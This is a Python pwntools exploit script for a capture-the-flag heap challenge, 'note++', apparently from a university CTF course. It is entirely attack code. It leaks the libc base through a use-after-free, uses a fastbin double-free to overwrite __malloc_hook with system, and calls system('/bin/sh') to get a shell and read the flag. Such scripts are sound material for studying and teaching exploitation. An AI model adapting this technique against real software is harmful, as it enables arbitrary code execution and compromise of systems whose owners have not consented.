# python 2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# chunk malloc hook
# r = remote('edu-ctf.csie.org', 10178)
r = process('./note++')

def add(size, note):
    r.sendafter('>', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', note)

def show(idx):
    r.sendafter('>', '2')
    r.sendafter('Index: ', str(idx))

def delete(idx):
    r.sendafter('>', '3')
    r.sendafter('Index: ', str(idx))

add(0x100, '\x87' * 4) # note 0
add(0x68, '\x88') # note 1, to avoid merging with top chunk
add(0x68, '\x89') # note 2, another fastbin size for fastbin 1, 2, 1 attack

# exploit UAF to do information leak
delete(0)
show(0)
r.recvline()

libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
print('libc_base --> ', hex(libc_base))

# create fastbin attack, for fake chunk
delete(1)
delete(2)
delete(1)

libc = ELF('./libc-2.23.so')

# send some malicious payload to it
# why 0x10 - 3??: to make system check for legel chunk (flag ok, size ok, can same size with 0x70 series)
add(0x68, p64(libc_base + libc.sym.__malloc_hook - 0x10 - 3))
print('write fake')
add(0x68, '\x87') # 0x68 is in the same series of 0x70 series
print('take 1')
add(0x68, '\x88') # 0x68 is in the same series of 0x70 series
print('take 2')


# malloc a fake chunk in it
add(0x68, '\x99\x99\x99' + p64(libc_base + libc.sym.system)) # overwrite __malloc_hook as system
print('overwrite __malloc_hook')

r.sendafter('>', '1')
r.sendafter('Size: ', str(libc_base + libc.search('/bin/sh').next()))

r.sendline('cat /home/`whoami`/flag')
print('FLAG --> ', r.recvuntil('}'))
r.close()
